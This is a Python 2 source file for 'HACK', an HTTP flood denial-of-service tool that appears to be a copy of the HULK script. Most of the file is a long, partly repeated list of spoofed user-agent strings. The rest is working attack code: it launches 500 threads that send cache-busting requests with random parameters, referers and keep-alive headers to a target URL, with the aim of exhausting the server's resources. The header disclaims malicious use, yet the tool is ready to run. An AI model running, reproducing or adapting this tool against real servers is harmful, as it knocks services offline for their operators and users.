# ----------------------------------------------------------------------------------------------
# HACK - HTTP Unbearable Load King
#
# this tool is a dos tool that is meant to put heavy load on HTTP servers in order to bring them
# to their knees by exhausting the resource pool, its is meant for research purposes only
# and any malicious usage of this tool is prohibited.
#
# author :  SIKARION , version 3.0
# ----------------------------------------------------------------------------------------------
import urllib2
import sys
import threading
import random
import re

#global params
url=''
host=''
headers_useragents=[]
headers_referers=[]
request_counter=0
flag=0
safe=0

def inc_counter():
	global request_counter
	request_counter+=1

def set_flag(val):
	global flag
	flag=val

def set_safe():
	global safe
	safe=1
	
# generates a user agent array
def useragent_list():
	global headers_useragents
	headers_useragents.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)')
	headers_useragents.append('Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51')
	headers_useragents.append('agadine/1.x.x (+http://www.agada.de)')
	headers_useragents.append('Agent-SharewarePlazaFileCheckBot/2.0+(+http://www.SharewarePlaza.com)')
	headers_useragents.append('AgentName/0.1 libwww-perl/5.48')
	headers_useragents.append('AIBOT/2.1 By +(www.21seek.com A Real artificial intelligence search engine China)')
	headers_useragents.append('AideRSS/1.0 (aiderss.com)')
	headers_useragents.append('aipbot/1.0 (aipbot; http://www.aipbot.com; aipbot@aipbot.com)')
	headers_useragents.append('aipbot/2-beta (aipbot dev; http://aipbot.com; aipbot@aipbot.com)')
	headers_useragents.append('Akregator/1.2.9; librss/remnants')
	headers_useragents.append('Aladin/3.324')
	headers_useragents.append('Alcatel-BG3/1.0 UP.Browser/5.0.3.1.2')
        headers_useragents.append('Aleksika Spider/1.0 (+http://www.aleksika.com/)')
        headers_useragents.append('AlertInfo 2.0 (Powered by Newsbrain)')
        headers_useragents.append('AlkalineBOT/1.3')
        headers_useragents.append('AlkalineBOT/1.4 (1.4.0326.0 RTM)')
        headers_useragents.append('Allesklar/0.1 libwww-perl/5.46')
        headers_useragents.append('Alligator 1.31 (www.nearsoftware.com)')
        headers_useragents.append('Allrati/1.1 (+)')
	headers_useragents.append('AltaVista Intranet V2.0 AVS EVAL search@freeit.com')
        headers_useragents.append('AltaVista Intranet V2.0 Compaq Altavista Eval sveand@altavista.net')
        headers_useragents.append('AltaVista Intranet V2.0 evreka.com crawler@evreka.com')
        headers_useragents.append('AltaVista V2.0B crawler@evreka.com')
        headers_useragents.append('amaya/x.xx libwww/x.x.x')
        headers_useragents.append('AmfibiBOT')
        headers_useragents.append('Amfibibot/0.06 (Amfibi Web Search; http://www.amfibi.com; agent@amfibi.com)')
        headers_useragents.append('Amfibibot/0.07 (Amfibi Robot; http://www.amfibi.com; agent@amfibi.com)')
        headers_useragents.append('amibot')
        headers_useragents.append('Amiga-AWeb/3.4.167SE')
        headers_useragents.append('AmigaVoyager/3.4.4 (MorphOS/PPC native)')
        headers_useragents.append('AmiTCP Miami (AmigaOS 2.04)')
        headers_useragents.append('Amoi 8512/R21.0 NF-Browser/3.3')
        headers_useragents.append('amzn_assoc')
	headers_useragents.append('AnnoMille spider 0.1 alpha - http://www.annomille.it')
        headers_useragents.append('annotate_google; http://ponderer.org/download/annotate_google.user.js')
        headers_useragents.append('Anonymized by ProxyOS: http://www.megaproxy.com')
        headers_useragents.append('Anonymizer/1.1')
        headers_useragents.append('AnswerBus (http://www.answerbus.com/)')
        headers_useragents.append('AnswerChase PROve x.0')
        headers_useragents.append('AnswerChase x.0')
        headers_useragents.append('ANTFresco/x.xx')
        headers_useragents.append('antibot-V1.1.5/i586-linux-2.2')
	headers_useragents.append('AnzwersCrawl/2.0 (anzwerscrawl@anzwers.com.au;Engine)')
        headers_useragents.append('Apexoo Spider 1.x')
        headers_useragents.append('Aplix HTTP/1.0.1')
        headers_useragents.append('Aplix_SANYO_browser/1.x (Japanese)')
        headers_useragents.append('Aplix_SEGASATURN_browser/1.x (Japanese)')
        headers_useragents.append('Aport')
        headers_useragents.append('appie 1.1 (www.walhello.com)')
        headers_useragents.append('Apple iPhone v1.1.4 CoreMedia v1.0.0.4A102')
        headers_useragents.append('Apple-PubSub/65.1.1')
        headers_useragents.append('ArabyBot (compatible; Mozilla/5.0; GoogleBot; FAST Crawler 6.4; http://www.araby.com;)')
        headers_useragents.append('ArachBot')
        headers_useragents.append('Arachnoidea (arachnoidea@euroseek.com)')
        headers_useragents.append('aranhabot')
        headers_useragents.append('ArchitextSpider')
        headers_useragents.append('archive.org_bot')
	headers_useragents.append('Argus/1.1 (Nutch; http://www.simpy.com/bot.html; feedback at simpy dot com)')
        headers_useragents.append('Arikus_Spider')
        headers_useragents.append('Arquivo-web-crawler (compatible; heritrix/1.12.1 +http://arquivo-web.fccn.pt)')
        headers_useragents.append('ASAHA Search Engine Turkey V.001 (http://www.asaha.com/)')
        headers_useragents.append('Asahina-Antenna/1.x')
        headers_useragents.append('Asahina-Antenna/1.x (libhina.pl/x.x ; libtime.pl/x.x)')
        headers_useragents.append('ask.24x.info')
        headers_useragents.append('AskAboutOil/0.06-rcp (Nutch; http://www.nutch.org/docs/en/bot.html; nutch-agent@askaboutoil.com)')
        headers_useragents.append('asked/Nutch-0.8 (web crawler; http://asked.jp; epicurus at gmail dot com)')
        headers_useragents.append('ASPSeek/1.2.5')
        headers_useragents.append('ASPseek/1.2.9d')
        headers_useragents.append('ASPSeek/1.2.x')
        headers_useragents.append('ASPSeek/1.2.xa')
        headers_useragents.append('ASPseek/1.2.xx')
        headers_useragents.append('ASPSeek/1.2.xxpre')
        headers_useragents.append('ASSORT/0.10')
        headers_useragents.append('asterias/2.0')
        headers_useragents.append('AtlocalBot/1.1 +(http://www.atlocal.com/local-web-site-owner.html)')
        headers_useragents.append('Atomic_Email_Hunter/4.0')
        headers_useragents.append('Atomz/1.0')
	headers_useragents.append('atSpider/1.0')
        headers_useragents.append('Attentio/Nutch-0.9-dev (Attentios beta blog crawler; www.attentio.com; info@attentio.com)')
        headers_useragents.append('AU-MIC/2.0 MMP/2.0')
        headers_useragents.append('AUDIOVOX-SMT5600')
        headers_useragents.append('augurfind')
        headers_useragents.append('augurnfind V-1.x')
        headers_useragents.append('autoemailspider')
        headers_useragents.append('autohttp')
        headers_useragents.append('autowebdir 1.1 (www.autowebdir.com)')
        headers_useragents.append('AV Fetch 1.0')
        headers_useragents.append('Avant Browser (http://www.avantbrowser.com)')
        headers_useragents.append('AVSearch-1.0(peter.turney@nrc.ca)')
        headers_useragents.append('AVSearch-2.0-fusionIdx-14-CompetitorWebSites')
        headers_useragents.append('AVSearch-3.0(AltaVista/AVC)')
        headers_useragents.append('AWeb')
        headers_useragents.append('axadine/ (Axadine Crawler; http://www.axada.de/; )')
        headers_useragents.append('AxmoRobot - Crawling your site for better indexing on www.axmo.com search engine.')
        headers_useragents.append('Azureus 2.x.x.x')
        headers_useragents.append('BabalooSpider/1.3 (BabalooSpider; http://www.babaloo.si; spider@babaloo.si)')
        headers_useragents.append('BaboomBot/1.x.x (+http://www.baboom.us)')
        headers_useragents.append('BackStreet Browser 3.x')
        headers_useragents.append('BaiduImagespider+(+http://www.baidu.jp/search/s308.html)')
        headers_useragents.append('BaiDuSpider')
        headers_useragents.append('Baiduspider+(+http://help.baidu.jp/system/05.html)')
        headers_useragents.append('Baiduspider+(+http://www.baidu.com/search/spider.htm)')
        headers_useragents.append('Baiduspider+(+http://www.baidu.com/search/spider_jp.html)')
        headers_useragents.append('Balihoo/Nutch-1.0-dev (Crawler for Balihoo.com search engine - obeys robots.txt and robots meta tags ; http://balihoo.com/index.aspx; robot at balihoo dot com)')
        headers_useragents.append('BanBots/1.2 (spider@banbots.com)')
        headers_useragents.append('Barca/2.0.xxxx')
        headers_useragents.append('(DreamPassport/3.0; isao/MyDiGiRabi)')
        headers_useragents.append('(Privoxy/1.0)')
        headers_useragents.append('*/Nutch-0.9-dev')
        headers_useragents.append('+SitiDi.net/SitiDiBot/1.0 (+Have Good Day)')
        headers_useragents.append('-DIE-KRAEHE- META-SEARCH-ENGINE/1.1 http://www.die-kraehe.de')
        headers_useragents.append('123spider-Bot (Version: 1.02) powered by www.123spider.de')
        headers_useragents.append('192.comAgent')
        headers_useragents.append('1st ZipCommander (Net) - http://www.zipcommander.com/')
        headers_useragents.append('2Bone_LinkChecker/1.0 libwww-perl/5.64')
        headers_useragents.append('4anything.com LinkChecker v2.0')
	headers_useragents.append('8484 Boston Project v 1.0')
        headers_useragents.append(':robot/1.0 (linux) ( admin e-mail: undefined http://www.neofonie.de/loesungen/search/robot.html )')
        headers_useragents.append('A-Online Search')
        headers_useragents.append('A1 Keyword Research/1.0.2 (+http://www.micro-sys.dk/products/keyword-research/) miggibot/2007.03.27')
        headers_useragents.append('A1 Sitemap Generator/1.0 (+http://www.micro-sys.dk/products/sitemap-generator/) miggibot/2006.01.24')
        headers_useragents.append('AbachoBOT')
        headers_useragents.append('AbachoBOT (Mozilla compatible)')
        headers_useragents.append('ABCdatos BotLink/5.xx.xxx#BBL')
        headers_useragents.append('Aberja Checkomat     Aberja Hybridsuchmaschine (Germany)')
        headers_useragents.append('abot/0.1 (abot; http://www.abot.com; abot@abot.com)')
        headers_useragents.append('About/0.1libwww-perl/5.47')
        headers_useragents.append('Accelatech RSSCrawler/0.4')
        headers_useragents.append('accoona  Accoona Search robot')
        headers_useragents.append('Accoona-AI-Agent/1.1.1 (crawler at accoona dot com)')
        headers_useragents.append('Accoona-AI-Agent/1.1.2 (aicrawler at accoonabot dot com)')
        headers_useragents.append('Ace Explorer')
        headers_useragents.append('Ack (http://www.ackerm.com/)')
        headers_useragents.append('AcoiRobot')
        headers_useragents.append('Acoon Robot v1.50.001')
        headers_useragents.append('Acoon Robot v1.52 (http://www.acoon.de)')
        headers_useragents.append('Acoon-Robot 4.0.x.[xx] (http://www.acoon.de)')
        headers_useragents.append('Acoon-Robot v3.xx (http://www.acoon.de and http://www.acoon.com)')
        headers_useragents.append('Acorn/Nutch-0.9 (Non-Profit Search Engine; acorn.isara.org; acorn at isara dot org)')
        headers_useragents.append('ActiveBookmark 1.x')
        headers_useragents.append('Activeworlds')
        headers_useragents.append('ActiveWorlds/3.xx (xxx)')
        headers_useragents.append('Ad Muncher v4.xx.x')
        headers_useragents.append('Ad Muncher v4x Build xxxxx')
        headers_useragents.append('Adaxas Spider (http://www.adaxas.net/)')
        headers_useragents.append('Advanced Browser (http://www.avantbrowser.com)')
        headers_useragents.append('AESOP_com_SpiderMan')
	headers_useragents.append('(DreamPassport/3.0; isao/MyDiGiRabi)')
        headers_useragents.append('(Privoxy/1.0)')
        headers_useragents.append('*/Nutch-0.9-dev')
        headers_useragents.append('+SitiDi.net/SitiDiBot/1.0 (+Have Good Day)')
        headers_useragents.append('-DIE-KRAEHE- META-SEARCH-ENGINE/1.1 http://www.die-kraehe.de')
        headers_useragents.append('123spider-Bot (Version: 1.02) powered by www.123spider.de')
        headers_useragents.append('192.comAgent')
        headers_useragents.append('1st ZipCommander (Net) - http://www.zipcommander.com/')
        headers_useragents.append('2Bone_LinkChecker/1.0 libwww-perl/5.64')
        headers_useragents.append('4anything.com LinkChecker v2.0')
        headers_useragents.append('8484 Boston Project v 1.0')
        headers_useragents.append(':robot/1.0 (linux) ( admin e-mail: undefined http://www.neofonie.de/loesungen/search/robot.html )')
        headers_useragents.append('A-Online Search')
        headers_useragents.append('A1 Keyword Research/1.0.2 (+http://www.micro-sys.dk/products/keyword-research/) miggibot/2007.03.27')
        headers_useragents.append('A1 Sitemap Generator/1.0 (+http://www.micro-sys.dk/products/sitemap-generator/) miggibot/2006.01.24')
        headers_useragents.append('AbachoBOT')
        headers_useragents.append('AbachoBOT (Mozilla compatible)')
        headers_useragents.append('ABCdatos BotLink/5.xx.xxx#BBL')
        headers_useragents.append('Aberja Checkomat     Aberja Hybridsuchmaschine (Germany)')
        headers_useragents.append('abot/0.1 (abot; http://www.abot.com; abot@abot.com)')
        headers_useragents.append('About/0.1libwww-perl/5.47')
        headers_useragents.append('Accelatech RSSCrawler/0.4')
        headers_useragents.append('accoona  Accoona Search robot')
        headers_useragents.append('Accoona-AI-Agent/1.1.1 (crawler at accoona dot com)')
        headers_useragents.append('Accoona-AI-Agent/1.1.2 (aicrawler at accoonabot dot com)')
        headers_useragents.append('Ace Explorer')
        headers_useragents.append('Ack (http://www.ackerm.com/)')
        headers_useragents.append('AcoiRobot')
        headers_useragents.append('Acoon Robot v1.50.001')
        headers_useragents.append('Acoon Robot v1.52 (http://www.acoon.de)')
        headers_useragents.append('Acoon-Robot 4.0.x.[xx] (http://www.acoon.de)')
        headers_useragents.append('Acoon-Robot v3.xx (http://www.acoon.de and http://www.acoon.com)')
        headers_useragents.append('Acorn/Nutch-0.9 (Non-Profit Search Engine; acorn.isara.org; acorn at isara dot org)')
        headers_useragents.append('ActiveBookmark 1.x')
        headers_useragents.append('Activeworlds')
        headers_useragents.append('ActiveWorlds/3.xx (xxx)')
        headers_useragents.append('Ad Muncher v4.xx.x')
        headers_useragents.append('Ad Muncher v4x Build xxxxx')
        headers_useragents.append('Adaxas Spider (http://www.adaxas.net/)')
        headers_useragents.append('Advanced Browser (http://www.avantbrowser.com)')
        headers_useragents.append('AESOP_com_SpiderMan')
        headers_useragents.append('agadine/1.x.x (+http://www.agada.de)')
        headers_useragents.append('Agent-SharewarePlazaFileCheckBot/2.0+(+http://www.SharewarePlaza.com)')
        headers_useragents.append('AgentName/0.1 libwww-perl/5.48')
        headers_useragents.append('AIBOT/2.1 By +(www.21seek.com A Real artificial intelligence search engine China)')
        headers_useragents.append('AideRSS/1.0 (aiderss.com)')
        headers_useragents.append('aipbot/1.0 (aipbot; http://www.aipbot.com; aipbot@aipbot.com)')
        headers_useragents.append('aipbot/2-beta (aipbot dev; http://aipbot.com; aipbot@aipbot.com)')
        headers_useragents.append('Akregator/1.2.9; librss/remnants')
        headers_useragents.append('Aladin/3.324')
        headers_useragents.append('Alcatel-BG3/1.0 UP.Browser/5.0.3.1.2')
        headers_useragents.append('Aleksika Spider/1.0 (+http://www.aleksika.com/)')
        headers_useragents.append('AlertInfo 2.0 (Powered by Newsbrain)')
        headers_useragents.append('AlkalineBOT/1.3')
        headers_useragents.append('AlkalineBOT/1.4 (1.4.0326.0 RTM)')
        headers_useragents.append('Allesklar/0.1 libwww-perl/5.46')
        headers_useragents.append('Alligator 1.31 (www.nearsoftware.com)')
        headers_useragents.append('Allrati/1.1 (+)')
        headers_useragents.append('AltaVista Intranet V2.0 AVS EVAL search@freeit.com')
        headers_useragents.append('AltaVista Intranet V2.0 Compaq Altavista Eval sveand@altavista.net')
        headers_useragents.append('AltaVista Intranet V2.0 evreka.com crawler@evreka.com')
        headers_useragents.append('AltaVista V2.0B crawler@evreka.com')
        headers_useragents.append('amaya/x.xx libwww/x.x.x')
        headers_useragents.append('AmfibiBOT')
        headers_useragents.append('Amfibibot/0.06 (Amfibi Web Search; http://www.amfibi.com; agent@amfibi.com)')
        headers_useragents.append('Amfibibot/0.07 (Amfibi Robot; http://www.amfibi.com; agent@amfibi.com)')
        headers_useragents.append('amibot')
        headers_useragents.append('Amiga-AWeb/3.4.167SE')
        headers_useragents.append('AmigaVoyager/3.4.4 (MorphOS/PPC native)')
        headers_useragents.append('AmiTCP Miami (AmigaOS 2.04)')
        headers_useragents.append('Amoi 8512/R21.0 NF-Browser/3.3')
        headers_useragents.append('amzn_assoc')
        headers_useragents.append('AnnoMille spider 0.1 alpha - http://www.annomille.it')
        headers_useragents.append('annotate_google; http://ponderer.org/download/annotate_google.user.js')
        headers_useragents.append('Anonymized by ProxyOS: http://www.megaproxy.com')
        headers_useragents.append('Anonymizer/1.1')
        headers_useragents.append('AnswerBus (http://www.answerbus.com/)')
	headers_useragents.append('AnswerChase PROve x.0')
        headers_useragents.append('AnswerChase x.0')
        headers_useragents.append('ANTFresco/x.xx')
        headers_useragents.append('antibot-V1.1.5/i586-linux-2.2')
        headers_useragents.append('AnzwersCrawl/2.0 (anzwerscrawl@anzwers.com.au;Engine)')
        headers_useragents.append('Apexoo Spider 1.x')
        headers_useragents.append('Aplix HTTP/1.0.1')
	headers_useragents.append('Aplix_SANYO_browser/1.x (Japanese)')
	headers_useragents.append('Aplix_SEGASATURN_browser/1.x (Japanese)')
        headers_useragents.append('Aport')
        headers_useragents.append('appie 1.1 (www.walhello.com)')
        headers_useragents.append('Apple iPhone v1.1.4 CoreMedia v1.0.0.4A102')
        headers_useragents.append('Apple-PubSub/65.1.1')
        headers_useragents.append('ArabyBot (compatible; Mozilla/5.0; GoogleBot; FAST Crawler 6.4; http://www.araby.com;)')
        headers_useragents.append('ArachBot')
        headers_useragents.append('Arachnoidea (arachnoidea@euroseek.com)')
        headers_useragents.append('aranhabot')
        headers_useragents.append('ArchitextSpider')
        headers_useragents.append('archive.org_bot')
        headers_useragents.append('Argus/1.1 (Nutch; http://www.simpy.com/bot.html; feedback at simpy dot com)')
        headers_useragents.append('Arikus_Spider')
        headers_useragents.append('Arquivo-web-crawler (compatible; heritrix/1.12.1 +http://arquivo-web.fccn.pt)')
        headers_useragents.append('ASAHA Search Engine Turkey V.001 (http://www.asaha.com/)')
        headers_useragents.append('Asahina-Antenna/1.x')
        headers_useragents.append('Asahina-Antenna/1.x (libhina.pl/x.x ; libtime.pl/x.x)')
        headers_useragents.append('ask.24x.info')
        headers_useragents.append('AskAboutOil/0.06-rcp (Nutch; http://www.nutch.org/docs/en/bot.html; nutch-agent@askaboutoil.com)')
        headers_useragents.append('asked/Nutch-0.8 (web crawler; http://asked.jp; epicurus at gmail dot com)')
        headers_useragents.append('ASPSeek/1.2.5')
        headers_useragents.append('ASPseek/1.2.9d')
        headers_useragents.append('ASPSeek/1.2.x')
        headers_useragents.append('ASPSeek/1.2.xa')
        headers_useragents.append('ASPseek/1.2.xx')
        headers_useragents.append('ASPSeek/1.2.xxpre')
        headers_useragents.append('ASSORT/0.10')
        headers_useragents.append('asterias/2.0')
        headers_useragents.append('AtlocalBot/1.1 +(http://www.atlocal.com/local-web-site-owner.html)')
        headers_useragents.append('Atomic_Email_Hunter/4.0')
        headers_useragents.append('Atomz/1.0')
        headers_useragents.append('atSpider/1.0')
        headers_useragents.append('Attentio/Nutch-0.9-dev (Attentios beta blog crawler; www.attentio.com; info@attentio.com)')
        headers_useragents.append('AU-MIC/2.0 MMP/2.0')
        headers_useragents.append('AUDIOVOX-SMT5600')
        headers_useragents.append('augurfind')
        headers_useragents.append('augurnfind V-1.x')
        headers_useragents.append('autoemailspider')
        headers_useragents.append('autohttp')
        headers_useragents.append('autowebdir 1.1 (www.autowebdir.com)')
        headers_useragents.append('AV Fetch 1.0')
        headers_useragents.append('Avant Browser (http://www.avantbrowser.com)')
        headers_useragents.append('AVSearch-1.0(peter.turney@nrc.ca)')
        headers_useragents.append('AVSearch-2.0-fusionIdx-14-CompetitorWebSites')
        headers_useragents.append('AVSearch-3.0(AltaVista/AVC)')
        headers_useragents.append('AWeb')
        headers_useragents.append('axadine/ (Axadine Crawler; http://www.axada.de/; )')
        headers_useragents.append('AxmoRobot - Crawling your site for better indexing on www.axmo.com search engine.')
        headers_useragents.append('Azureus 2.x.x.x')
        headers_useragents.append('BabalooSpider/1.3 (BabalooSpider; http://www.babaloo.si; spider@babaloo.si)')
        headers_useragents.append('BaboomBot/1.x.x (+http://www.baboom.us)')
        headers_useragents.append('BackStreet Browser 3.x')
        headers_useragents.append('BaiduImagespider+(+http://www.baidu.jp/search/s308.html)')
        headers_useragents.append('BaiDuSpider')
        headers_useragents.append('Baiduspider+(+http://help.baidu.jp/system/05.html)')
        headers_useragents.append('Baiduspider+(+http://www.baidu.com/search/spider.htm)')
        headers_useragents.append('Baiduspider+(+http://www.baidu.com/search/spider_jp.html)')
        headers_useragents.append('Balihoo/Nutch-1.0-dev (Crawler for Balihoo.com search engine - obeys robots.txt and robots meta tags ; http://balihoo.com/index.aspx; robot at balihoo dot com)')
        headers_useragents.append('BanBots/1.2 (spider@banbots.com)')
        headers_useragents.append('Barca/2.0.xxxx')
        headers_useragents.append('BarcaPro/1.4.xxxx')
        headers_useragents.append('BarraHomeCrawler (albertof@barrahome.org)')
        headers_useragents.append('bCentral Billing Post-Process')
        headers_useragents.append('bdcindexer_2.6.2 (research@bdc)')
        headers_useragents.append('BDFetch')
        headers_useragents.append('BDNcentral Crawler v2.3 [en] (http://www.bdncentral.com/robot.html) (X11; I; Linux 2.0.44 i686)')
        headers_useragents.append('BeamMachine/0.5 (dead link remover of www.beammachine.net)')
        headers_useragents.append('beautybot/1.0 (+http://www.uchoose.de/crawler/beautybot/)')
        headers_useragents.append('BebopBot/2.5.1 ( crawler http://www.apassion4jazz.net/bebopbot.html )')
        headers_useragents.append('BeebwareDirectory/v0.01')
        headers_useragents.append('Big Brother (http://pauillac.inria.fr/~fpottier/)')
        headers_useragents.append('Big Fish v1.0')
        headers_useragents.append('BigBrother/1.6e')
        headers_useragents.append('BigCliqueBOT/1.03-dev (bigclicbot; http://www.bigclique.com; bot@bigclique.com)')
        headers_useragents.append('BIGLOTRON (Beta 2;GNU/Linux)')
        headers_useragents.append('Bigsearch.ca/Nutch-x.x-dev (Bigsearch.ca Internet Spider; http://www.bigsearch.ca/; info@enhancededge.com)')
        headers_useragents.append('Bilbo/2.3b-UNIX')
        headers_useragents.append('BilgiBetaBot/0.8-dev (bilgi.com (Beta) ; http://lucene.apache.org/nutch/bot.html; nutch-agent@lucene.apache.org)')
        headers_useragents.append('BilgiBot/1.0(beta) (http://www.bilgi.com/; bilgi at bilgi dot com)')
        headers_useragents.append('billbot wjj@cs.cmu.edu')
        headers_useragents.append('Bitacle bot/1.1')
        headers_useragents.append('Bitacle Robot (V:1.0;) (http://www.bitacle.com)')
        headers_useragents.append('Biyubi/x.x (Sistema Fenix; G11; Familia Toledo; es-mx)')
        headers_useragents.append('BlackBerry7520/4.0.0 Profile/MIDP-2.0 Configuration/CLDC-1.1 UP.Browser/5.0.3.3 UP.Link/5.1.2.12 (Google WAP Proxy/1.0)')
        headers_useragents.append('BlackWidow')
        headers_useragents.append('BlackWidow')
        headers_useragents.append('Blaiz-Bee/1.0 (+http://www.blaiz.net)')
        headers_useragents.append('Blaiz-Bee/2.00.8222 (BE Internet Search Engine http://www.rawgrunt.com)')
        headers_useragents.append('Blaiz-Bee/2.00.xxxx (+http://www.blaiz.net)')
        headers_useragents.append('BlitzBOT@tricus.net')
        headers_useragents.append('BlitzBOT@tricus.net (Mozilla compatible)')
        headers_useragents.append('BlockNote.Net')
        headers_useragents.append('BlogBot/1.x')
        headers_useragents.append('BlogBridge 2.13 (http://www.blogbridge.com/)')
        headers_useragents.append('Bloglines Title Fetch/1.0 (http://www.bloglines.com)')
        headers_useragents.append('Bloglines-Images/0.1 (http://www.bloglines.com)')
        headers_useragents.append('Bloglines/3.1 (http://www.bloglines.com)')
        headers_useragents.append('BlogMap (http://www.feedmap.net)')
	headers_useragents.append('Blogpulse (info@blogpulse.com)')
	headers_useragents.append('BlogPulseLive (support@blogpulse.com)')
	headers_useragents.append('BlogSearch/1.x +http://www.icerocket.com/')
	headers_useragents.append('blogsearchbot-pumpkin-3')
	return(headers_useragents)

# generates a referer array
def referer_list():
	global headers_referers
	headers_referers.append('http://www.google.com/?q=')
	headers_referers.append('http://www.usatoday.com/search/results?q=')
	headers_referers.append('http://engadget.search.aol.com/search?q=')
	headers_referers.append('http://' + host + '/')
	return(headers_referers)
	
#builds random ascii string
def buildblock(size):
	out_str = ''
	for i in range(0, size):
		a = random.randint(65, 90)
		out_str += chr(a)
	return(out_str)

def usage():
	print '---------------------------------------------------'
        print '     ####  # #    #   ##   #####  #  ####  #    # '
        print '    #      # #   #   #  #  #    # # #    # ##   # '
        print '     ####  # ####   #    # #    # # #    # # #  # '
        print '         # # #  #   ###### #####  # #    # #  # # '
        print '    #    # # #   #  #    # #   #  # #    # #   ## '
        print '     ####  # #    # #    # #    # #  ####  #    # '
        print '(((((((((((((((((((((((((())))))))))))))))))))))))'
	print 'USAGE: python hack.py <url>'
	print 'you can add "safe" after url, to autoshut after dos'
        print '(((((((((((((((((((((((((()))))))))))))))))))))))) '
        print '---------------------------------------------------'

	
#http request
def httpcall(url):
	useragent_list()
	referer_list()
	code=0
	if url.count("?")>0:
		param_joiner="&"
	else:
		param_joiner="?"
	request = urllib2.Request(url + param_joiner + buildblock(random.randint(3,10)) + '=' + buildblock(random.randint(3,10)))
	request.add_header('User-Agent', random.choice(headers_useragents))
	request.add_header('Cache-Control', 'no-cache')
	request.add_header('Accept-Charset', 'ISO-8859-1,utf-8;q=0.7,*;q=0.7')
	request.add_header('Referer', random.choice(headers_referers) + buildblock(random.randint(5,10)))
	request.add_header('Keep-Alive', random.randint(110,120))
	request.add_header('Connection', 'keep-alive')
	request.add_header('Host',host)
	try:
			urllib2.urlopen(request)
	except urllib2.HTTPError, e:
			#print e.code
			set_flag(1)
			print 'Response Code 500 (By SIKARION)'
			code=500
	except urllib2.URLError, e:
			#print e.reason
			sys.exit()
	else:
			inc_counter()
			urllib2.urlopen(request)
	return(code)		

	
#http caller thread 
class HTTPThread(threading.Thread):
	def run(self):
		try:
			while flag<2:
				code=httpcall(url)
				if (code==500) & (safe==1):
					set_flag(2)
		except Exception, ex:
			pass

# monitors http threads and counts requests
class MonitorThread(threading.Thread):
	def run(self):
		previous=request_counter
		while flag==0:
			if (previous+100<request_counter) & (previous<>request_counter):
				print "%d Requests Sent" % (request_counter)
				previous=request_counter
		if flag==2:
			print "\n-- HACK Attack Finished --"

#execute 
if len(sys.argv) < 2:
	usage()
	sys.exit()
else:
	if sys.argv[1]=="help":
		usage()
		sys.exit()
	else:
		print "-- HACK Attack Started --"
		if len(sys.argv)== 3:
			if sys.argv[2]=="safe":
				set_safe()
		url = sys.argv[1]
		if url.count("/")==2:
			url = url + "/"
		m = re.search('(https?\://)?([^/]*)/?.*', url)
		host = m.group(2)
		for i in range(500):
			t = HTTPThread()
			t.start()
		t = MonitorThread()
		t.start()
